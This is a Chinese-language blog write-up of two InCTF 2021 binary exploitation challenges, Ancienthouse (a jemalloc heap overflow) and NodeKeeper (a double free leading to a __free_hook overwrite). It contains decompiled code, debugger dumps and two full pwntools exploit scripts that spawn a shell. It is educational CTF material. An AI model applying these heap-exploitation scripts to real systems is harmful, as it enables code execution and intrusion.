<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>InCTF2021-Ancienthouse/NodeKeeper-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Ancienthouse 这道题用了 2.2.5 版本 jemalloc 作为分配器，而不是传统的 ptmalloc。jemalloc 是 Facebook 开发的一个分配器，在 Firefox 和 redis 中都有应用。据说比 ptmalloc 有更好的性能"><meta property="og:image" content><meta property="og:title" content="InCTF2021-Ancienthouse/NodeKeeper-WP"><meta property="og:description" content="Ancienthouse 这道题用了 2.2.5 版本 jemalloc 作为分配器，而不是传统的 ptmalloc。jemalloc 是 Facebook 开发的一个分配器，在 Firefox 和 redis 中都有应用。据说比 ptmalloc 有更好的性能"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/1537.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-08-16T11:55:00+00:00"><meta property="article:modified_time" content="2021-08-16T11:55:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="InCTF2021-Ancienthouse/NodeKeeper-WP"><meta name=twitter:description content="Ancienthouse 这道题用了 2.2.5 版本 jemalloc 作为分配器，而不是传统的 ptmalloc。jemalloc 是 Facebook 开发的一个分配器，在 Firefox 和 redis 中都有应用。据说比 ptmalloc 有更好的性能"><script src=https://chujdk.github.io/js/feather.min.js></script>
<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts.html>All posts</a>
<a href=/about.html>About</a>
<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>InCTF2021-Ancienthouse/NodeKeeper-WP</h1><div class=meta>Posted on Aug 16, 2021</div></div><section class=body><h2 id=ancienthouse>Ancienthouse</h2><p>这道题用了 2.2.5 版本 jemalloc 作为分配器，而不是传统的 ptmalloc。jemalloc 是 Facebook 开发的一个分配器，在 Firefox 和 redis 中都有应用。据说比 ptmalloc 有更好的性能，特别是在多线程下的表现非常优秀。我也是第一次听说这个东西，为了解题简单地了解了一下。在 csdn 上看到<a href=https://blog.csdn.net/txx_683/article/details/53468211>一个很棒的系列</a>，如果有兴趣跟着这些文章结合源码就可以理解的比较清楚了。我这里不再细讲，只说和题目相关的。</p><p>首先是漏洞点，这个很好发现。merge 操作中的 name 的拼接中存在堆溢出，可以溢出和堆块大小等长的长度</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span><span style=color:#007020;font-weight:700>__fastcall</span> <span style=color:#06287e>strcat_name</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>str1, <span style=color:#902000>char</span> <span style=color:#666>*</span>str2, <span style=color:#902000>unsigned</span> <span style=color:#007020;font-weight:700>__int64</span> tot_len)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#902000>unsigned</span> <span style=color:#007020;font-weight:700>__int64</span> i; <span style=color:#60a0b0;font-style:italic>// [rsp+20h] [rbp-10h]
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  size_t v6; <span style=color:#60a0b0;font-style:italic>// [rsp+28h] [rbp-8h]
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span>  v6 <span style=color:#666>=</span> strlen(str1);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> ( i <span style=color:#666>=</span> <span style=color:#40a070>0LL</span>; i <span style=color:#666>&lt;</span> tot_len; <span style=color:#666>++</span>i )
</span></span><span style=display:flex><span>    str1[i <span style=color:#666>+</span> v6] <span style=color:#666>=</span> str2[i];
</span></span><span style=display:flex><span>  str1[i <span style=color:#666>+</span> v6] <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> str1;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>((<span style=color:#902000>void</span> (<span style=color:#007020;font-weight:700>__fastcall</span> <span style=color:#666>*</span>)(_QWORD))<span style=color:#666>*</span>vtable)(vtable[<span style=color:#40a070>1</span>]);
</span></span></code></pre></div><p>退出时会进行这样一个调用，所以思路就是通过 malloc 修改 vtable 这个结构体的前 8 字节为 system，然后紧跟着 <code>/bin/sh</code> 即可 getshell。同时 got 表中是有 system 的。</p><p>所以主要要做的就是 leak 出进程基址和对堆块的修改。</p><p>jemalloc 以 <code>run</code> 为单位来分配单个内存块，每个 run 都分配同样大小的 extend。比如下面就是一个 0x50 大小的 <code>run</code>。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>pwndbg<span style=color:#666>&gt;</span> x<span style=color:#666>/</span><span style=color:#40a070>20</span>xg <span style=color:#40a070>0x7ffff7008000</span>
</span></span><span style=display:flex><span><span style=color:#40a070>0x7ffff7008000</span><span style=color:#666>:</span> <span style=color:#40a070>0x00007ffff7800ca8</span>      <span style=color:#40a070>0x0000003100000001</span>
</span></span><span style=display:flex><span><span style=color:#40a070>0x7ffff7008010</span><span style=color:#666>:</span> <span style=color:#40a070>0x0003fffffffffffe</span>      <span style=color:#40a070>0x0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#40a070>0x7ffff7008020</span><span style=color:#666>:</span> <span style=color:#40a070>0x0000000000000000</span>      <span style=color:#40a070>0x0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#40a070>0x7ffff7008030</span><span style=color:#666>:</span> <span style=color:#40a070>0x0000000000000000</span>      <span style=color:#40a070>0x0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#40a070>0x7ffff7008040</span><span style=color:#666>:</span> <span style=color:#40a070>0x0000000000000000</span>      <span style=color:#40a070>0x0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#40a070>0x7ffff7008050</span><span style=color:#666>:</span> <span style=color:#40a070>0x0000000000000000</span>      <span style=color:#40a070>0x0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#40a070>0x7ffff7008060</span><span style=color:#666>:</span> <span style=color:#40a070>0x0000555555555b82</span>      <span style=color:#40a070>0x0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#40a070>0x7ffff7008070</span><span style=color:#666>:</span> <span style=color:#40a070>0x0000000000000000</span>      <span style=color:#40a070>0x0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#40a070>0x7ffff7008080</span><span style=color:#666>:</span> <span style=color:#40a070>0x0000000000000000</span>      <span style=color:#40a070>0x0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#40a070>0x7ffff7008090</span><span style=color:#666>:</span> <span style=color:#40a070>0x0000000000000000</span>      <span style=color:#40a070>0x0000000000000000</span>
</span></span></code></pre></div><p>对于的 <code>run</code> 的 header 的结构为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>pwndbg<span style=color:#666>&gt;</span> p <span style=color:#666>*</span>arenas[<span style=color:#40a070>0</span>]<span style=color:#666>-&gt;</span>bins[<span style=color:#40a070>5</span>]<span style=color:#666>-&gt;</span>runcur
</span></span><span style=display:flex><span><span>$</span><span style=color:#40a070>11</span> <span style=color:#666>=</span> {
</span></span><span style=display:flex><span>  bin <span style=color:#666>=</span> <span style=color:#40a070>0x7ffff7800ca8</span>,
</span></span><span style=display:flex><span>  nextind <span style=color:#666>=</span> <span style=color:#40a070>1</span>,
</span></span><span style=display:flex><span>  nfree <span style=color:#666>=</span> <span style=color:#40a070>49</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>有趣的是这里的 bin 字段似乎可以用不上的，也就是说可以随意覆写</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>pwndbg<span style=color:#666>&gt;</span> x<span style=color:#666>/</span><span style=color:#40a070>20</span>xg <span style=color:#40a070>0x00007ffff7008000</span>
</span></span><span style=display:flex><span><span style=color:#40a070>0x7ffff7008000</span><span style=color:#666>:</span> <span style=color:#40a070>0x0000000000000000</span>      <span style=color:#40a070>0x0000003000000002</span>
</span></span><span style=display:flex><span><span style=color:#40a070>0x7ffff7008010</span><span style=color:#666>:</span> <span style=color:#40a070>0x0003fffffffffffc</span>      <span style=color:#40a070>0x0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#40a070>0x7ffff7008020</span><span style=color:#666>:</span> <span style=color:#40a070>0x0000000000000000</span>      <span style=color:#40a070>0x0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#40a070>0x7ffff7008030</span><span style=color:#666>:</span> <span style=color:#40a070>0x0000000000000000</span>      <span style=color:#40a070>0x0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#40a070>0x7ffff7008040</span><span style=color:#666>:</span> <span style=color:#40a070>0x0000000000000000</span>      <span style=color:#40a070>0x0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#40a070>0x7ffff7008050</span><span style=color:#666>:</span> <span style=color:#40a070>0x0000000000000000</span>      <span style=color:#40a070>0x0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#40a070>0x7ffff7008060</span><span style=color:#666>:</span> <span style=color:#40a070>0x0000555555555b82</span>      <span style=color:#40a070>0x0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#40a070>0x7ffff7008070</span><span style=color:#666>:</span> <span style=color:#40a070>0x0000000000000000</span>      <span style=color:#40a070>0x0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#40a070>0x7ffff7008080</span><span style=color:#666>:</span> <span style=color:#40a070>0x0000000000000000</span>      <span style=color:#40a070>0x0000000000000000</span>
</span></span><span style=display:flex><span><span style=color:#40a070>0x7ffff7008090</span><span style=color:#666>:</span> <span style=color:#40a070>0x0000000000000000</span>      <span style=color:#40a070>0x0000000000000000</span>
</span></span></code></pre></div><p>比如改写成 0 也是可以完成分配的。那么如果可以覆写 nextind 字段为 0，就可以分配到虚表上实现对函数指针的修改。本来有打算通过溢出来实现覆写，但是由于申请的次数受到了限制，遂作罢。</p><p>最后的思路是通过溢出部分覆写 name 字段，指向虚表，free 掉，过程中 leak 出进程地址，申请回来完全控制虚表。在部分覆写的时候可以 leak 出堆地址，这样 &lsquo;/bin/sh\x00&rsquo; 就比较好布置了。</p><p>不过由于 strcat_name 时会在末尾补零，所以需要先把堆地址 leak 出来。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>#!/usr/bin/env python
</span></span><span style=display:flex><span># coding=utf-8
</span></span><span style=display:flex><span>from pwn import *
</span></span><span style=display:flex><span>context.log_level = &#39;debug&#39;
</span></span><span style=display:flex><span>context.terminal = [&#34;tmux&#34;, &#34;splitw&#34;, &#34;-h&#34;]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>#sh = process(&#34;./Ancienthouse&#34;)
</span></span><span style=display:flex><span>sh = remote(&#34;pwn.challenge.bi0s.in&#34;, 1230)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def addEnemy(size, name):
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt;&gt; &#34;, &#39;1&#39;)
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;size : &#34;, str(size))
</span></span><span style=display:flex><span>    sh.sendafter(&#34;name : &#34;, name)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def battel(idx):
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt;&gt; &#34;, &#39;2&#39;)
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;id : &#34;, str(idx))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def battel_win_handle(choice):
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt;&gt;&#34;, str(choice))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def merge(idx_1, idx_2):
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt;&gt; &#34;, &#39;3&#39;)
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;id 1: &#34;, str(idx_1))
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;id 2: &#34;, str(idx_2))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def flee():
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt;&gt; &#34;, &#39;4&#39;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;!! : &#34;, &#34;/bin/sh\x00&#34;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>addEnemy(0x20, &#39;a&#39; * 0x20)  # 0
</span></span><span style=display:flex><span>addEnemy(0x10, &#39;a&#39; * 0x9)   # 1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>battel(0)
</span></span><span style=display:flex><span>sh.recvuntil(&#34;Starting battle with &#34;)
</span></span><span style=display:flex><span>sh.recvuntil(&#39;a&#39; * 0x20)
</span></span><span style=display:flex><span>heap_target_base = u64(sh.recv(6).ljust(8, &#39;\x00&#39;)) - 0x6050 + 0x8060
</span></span><span style=display:flex><span>bin_sh_addr = heap_target_base - 0x8060 + 0x7040
</span></span><span style=display:flex><span>log.success(&#34;vtable: &#34; + hex(heap_target_base))
</span></span><span style=display:flex><span>log.success(&#34;/bin/sh: &#34; + hex(bin_sh_addr))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>addEnemy(0x10, &#39;a&#39; * 0x10)                                  # 2 
</span></span><span style=display:flex><span>addEnemy(0x10, &#39;a&#39; * 0x7 + p64(heap_target_base) + &#39;\x0E&#39;)  # 3
</span></span><span style=display:flex><span>addEnemy(0x50, &#39;idx 4&#39;)                                     # 4
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>for i in range(100 // 15):
</span></span><span style=display:flex><span>    battel(3)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>battel(3)
</span></span><span style=display:flex><span>battel_win_handle(1)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>merge(1, 2)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>battel(4)
</span></span><span style=display:flex><span>sh.recvuntil(&#34;Starting battle with &#34;)
</span></span><span style=display:flex><span>prog_base = u64(sh.recv(6).ljust(8, &#39;\x00&#39;)) - 0x1B82
</span></span><span style=display:flex><span>system = prog_base + 0x1170
</span></span><span style=display:flex><span>log.success(&#34;system: &#34; + hex(system))
</span></span><span style=display:flex><span>battel_win_handle(1)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>addEnemy(0x50, p64(system) + p64(bin_sh_addr))   # 5
</span></span><span style=display:flex><span>#gdb.attach(proc.pidof(sh)[0])
</span></span><span style=display:flex><span>flee()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh.interactive()
</span></span></code></pre></div><p>总结：虽然这题用了 jemalloc，但是实际上并没有通过 jemalloc 实现利用，而是通过程序自身的逻辑完成的利用。另外由于 jemalloc 对于空闲的堆块并没有进行复用，所以布置数据的时候也可以比较随意。这道题还是比较简单的。</p><h2 id=nodekeeper>NodeKeeper</h2><p>漏洞点也是很明显</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>  <span style=color:#007020;font-weight:700>else</span> <span style=color:#06287e>if</span> ( CountArr[v4] <span style=color:#666>&gt;</span> <span style=color:#40a070>1u</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    ptr <span style=color:#666>=</span> node;
</span></span><span style=display:flex><span>    Table[v4] <span style=color:#666>=</span> node<span style=color:#666>-&gt;</span>next;
</span></span><span style=display:flex><span>    <span style=color:#666>--</span>CountArr[v4];
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> ( <span style=color:#666>!</span>CountArr[v4] )
</span></span><span style=display:flex><span>    Table[v4] <span style=color:#666>=</span> <span style=color:#40a070>0LL</span>;
</span></span><span style=display:flex><span>  printf(<span style=color:#4070a0>&#34;Do you want to keep it (y/n)? &#34;</span>);
</span></span><span style=display:flex><span>  getInp(<span style=color:#666>&amp;</span>v1, <span style=color:#40a070>2u</span>);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> ( v1 <span style=color:#666>==</span> <span style=color:#4070a0>&#39;y&#39;</span> <span style=color:#666>||</span> v1 <span style=color:#666>==</span> <span style=color:#4070a0>&#39;Y&#39;</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> ( j <span style=color:#666>=</span> <span style=color:#40a070>0</span>; j <span style=color:#666>&lt;=</span> <span style=color:#40a070>9</span> <span style=color:#666>&amp;&amp;</span> Table[j]; <span style=color:#666>++</span>j )
</span></span><span style=display:flex><span>      ;
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> ( j <span style=color:#666>&gt;</span> <span style=color:#40a070>9</span> )
</span></span><span style=display:flex><span>      Err(<span style=color:#4070a0>&#34;No more space available&#34;</span>);
</span></span><span style=display:flex><span>    Table[j] <span style=color:#666>=</span> ptr;
</span></span><span style=display:flex><span>    CountArr[j] <span style=color:#666>=</span> <span style=color:#40a070>1</span>;
</span></span><span style=display:flex><span>  }
</span></span></code></pre></div><p>unlink 操作中，没有对节点的 next 指针置零。在 remove 的 1337 号功能下可以绕过 CountArr 的控制实现 double free</p><p>考虑首先 leak 出堆地址，然后伪造 data_ptr 指向一个 fake_chunk，free 掉进入 unsorted bin，leak 出 libc。最后通过 fake_chunk 的 chunk overlapping 打 free_hook</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>  <span style=color:#007020;font-weight:700>else</span> <span style=color:#06287e>if</span> ( v4 )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> ( v4 <span style=color:#666>&gt;=</span> CountArr[v2] )
</span></span><span style=display:flex><span>      Err(<span style=color:#4070a0>&#34;Invalid offset&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> ( i <span style=color:#666>=</span> <span style=color:#40a070>1</span>; v4 <span style=color:#666>&gt;</span> i; <span style=color:#666>++</span>i )
</span></span><span style=display:flex><span>      ptr <span style=color:#666>=</span> ptr<span style=color:#666>-&gt;</span>next;
</span></span><span style=display:flex><span>    v6 <span style=color:#666>=</span> ptr<span style=color:#666>-&gt;</span>next;
</span></span><span style=display:flex><span>    ptr<span style=color:#666>-&gt;</span>next <span style=color:#666>=</span> ptr<span style=color:#666>-&gt;</span>next<span style=color:#666>-&gt;</span>next;
</span></span><span style=display:flex><span>    <span style=color:#666>--</span>CountArr[v2];
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> ( <span style=color:#666>!</span>v6<span style=color:#666>-&gt;</span>data_ptr )
</span></span><span style=display:flex><span>      Err(<span style=color:#4070a0>&#34;Error&#34;</span>);
</span></span><span style=display:flex><span>    free(v6<span style=color:#666>-&gt;</span>data_ptr);
</span></span><span style=display:flex><span>    free(v6);
</span></span><span style=display:flex><span>  }
</span></span></code></pre></div><p>注意到在这个删除下不会清空 data_ptr，就可以 leak 堆地址了。</p><p>具体的流程比较麻烦，我也不想写了，看 exp 应该可以理解。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>#!/usr/bin/env python
</span></span><span style=display:flex><span># coding=utf-8
</span></span><span style=display:flex><span>from pwn import *
</span></span><span style=display:flex><span>context.log_level = &#39;debug&#39;
</span></span><span style=display:flex><span>context.terminal = [&#34;tmux&#34;, &#34;splitw&#34;, &#34;-h&#34;]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>#sh = process(&#34;./chall&#34;)
</span></span><span style=display:flex><span>sh = remote(&#34;&#34;)
</span></span><span style=display:flex><span>libc = ELF(&#34;./libc.so.6&#34;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def add(length, data):
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt;&gt; &#34;, &#39;1&#39;)
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;length : &#34;, str(length))
</span></span><span style=display:flex><span>    sh.sendafter(&#34;data : &#34;, data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def Remove(idx, offset):
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt;&gt; &#34;, &#39;2&#39;)
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;index: &#34;, str(idx))
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;all) &#34;, str(offset))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def link(from_idx, to_idx):
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt;&gt; &#34;, &#39;3&#39;)
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;to index: &#34;, str(to_idx))
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;from index: &#34;, str(from_idx))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def unlink(idx, offset, keep):
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;&gt;&gt; &#34;, &#39;4&#39;)
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;index: &#34;, str(idx))
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;offset: &#34;, str(offset))
</span></span><span style=display:flex><span>    sh.sendlineafter(&#34;(y/n)? &#34;, keep)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>add(0x28, &#39;idx:0\n&#39;)
</span></span><span style=display:flex><span>add(0x18, &#39;idx:1\n&#39;)
</span></span><span style=display:flex><span>add(0x28, &#39;idx:2\n&#39;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>link(1, 0)
</span></span><span style=display:flex><span>link(2, 0)
</span></span><span style=display:flex><span>unlink(0, 2, &#39;y&#39;)
</span></span><span style=display:flex><span>Remove(0, 2)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>add(0x18, &#39;\n&#39;) # idx: 2
</span></span><span style=display:flex><span>add(0x28, &#39;idx: 3\n&#39;) # avoid double free err
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Remove(1, 1337)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>link(3, 2)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span># unlink with leak
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;&gt;&gt; &#34;, &#39;4&#39;)
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;index: &#34;, str(2))
</span></span><span style=display:flex><span>sh.recvuntil(&#34;Offset 1 : &#34;)
</span></span><span style=display:flex><span>heap_base = u64(sh.recv(6).ljust(8, &#39;\x00&#39;)) - 0x310
</span></span><span style=display:flex><span>log.success(&#34;heap_base: &#34; + hex(heap_base))
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;offset: &#34;, str(1))
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;(y/n)? &#34;, &#39;y&#39;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Remove(0, 1)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span># fake head
</span></span><span style=display:flex><span>payload = p64(0) + p64(0)
</span></span><span style=display:flex><span>payload += p64(0) + p64(0x4B1)
</span></span><span style=display:flex><span>payload += p64(heap_base) + p64(heap_base)
</span></span><span style=display:flex><span>add(0x38, payload) # idx: 0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span># fill tcache
</span></span><span style=display:flex><span>add(0x38, &#39;\n&#39;) # idx: 3
</span></span><span style=display:flex><span>for i in range(6):
</span></span><span style=display:flex><span>    add(0x38, &#39;\n&#39;) # idx: 4
</span></span><span style=display:flex><span>    link(4, 3)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Remove(3, 1337)
</span></span><span style=display:flex><span>Remove(0, 1)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>add(0x48, &#39;\n&#39;) # idx: 0
</span></span><span style=display:flex><span>for i in range(6):
</span></span><span style=display:flex><span>    add(0x48, &#39;\n&#39;) # idx: 3
</span></span><span style=display:flex><span>    link(3, 0)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload = p64(0) * 2
</span></span><span style=display:flex><span>payload += p64(0x4B0) + p64(0x21) * 6
</span></span><span style=display:flex><span>add(0x48, payload)
</span></span><span style=display:flex><span>link(3, 0)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>unlink(0, 7, &#39;y&#39;) # left in idx 3
</span></span><span style=display:flex><span>Remove(0, 7)
</span></span><span style=display:flex><span>add(0x18, p64(0) + p64(0x100) + p64(heap_base + 0x3D0 + 0x10))
</span></span><span style=display:flex><span>Remove(3, 1337)
</span></span><span style=display:flex><span>for i in range(6):
</span></span><span style=display:flex><span>    Remove(0, 1)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>for i in range(5):
</span></span><span style=display:flex><span>    add(0x38, &#39;\n&#39;) # 0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>add(0x38, &#39;\n&#39;) # idx: 8
</span></span><span style=display:flex><span>Remove(0, 1)
</span></span><span style=display:flex><span>Remove(3, 1)
</span></span><span style=display:flex><span>Remove(5, 1)
</span></span><span style=display:flex><span>Remove(6, 1)
</span></span><span style=display:flex><span>Remove(7, 1)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>add(0x28, &#39;\n&#39;) # 0
</span></span><span style=display:flex><span>add(0x28, &#39;\n&#39;) # 3
</span></span><span style=display:flex><span>add(0x18, &#39;\n&#39;) # 5
</span></span><span style=display:flex><span>add(0x18, &#39;\n&#39;) # 6
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>add(0x28, &#39;\n&#39;) # 7
</span></span><span style=display:flex><span>Remove(5, 1)
</span></span><span style=display:flex><span>add(0x28, &#39;\n&#39;) # 0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>link(7, 8)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span># unlink with leak
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;&gt;&gt; &#34;, &#39;4&#39;)
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;index: &#34;, str(8))
</span></span><span style=display:flex><span>sh.recvuntil(&#34;Offset 1 : &#34;)
</span></span><span style=display:flex><span>libc_base = u64(sh.recv(6).ljust(8, &#39;\x00&#39;)) - libc.sym[&#34;__malloc_hook&#34;] - 0x70
</span></span><span style=display:flex><span>log.success(&#34;libc_base: &#34; + hex(libc_base))
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;offset: &#34;, str(1))
</span></span><span style=display:flex><span>sh.sendlineafter(&#34;(y/n)? &#34;, &#39;y&#39;)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>system = libc_base + libc.sym[&#34;system&#34;]
</span></span><span style=display:flex><span>__free_hook = libc_base + libc.sym[&#34;__free_hook&#34;]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>add(0x60, p64(0) * 7 + p64(0x41) + p64(__free_hook))
</span></span><span style=display:flex><span>Remove(0, 1)
</span></span><span style=display:flex><span>Remove(3, 1)
</span></span><span style=display:flex><span>Remove(6, 1)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>add(0x38, &#39;/bin/sh\x00&#39;) # 0
</span></span><span style=display:flex><span>add(0x38, p64(system))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Remove(0, 1)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>#gdb.attach(proc.pidof(sh)[0])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sh.interactive()
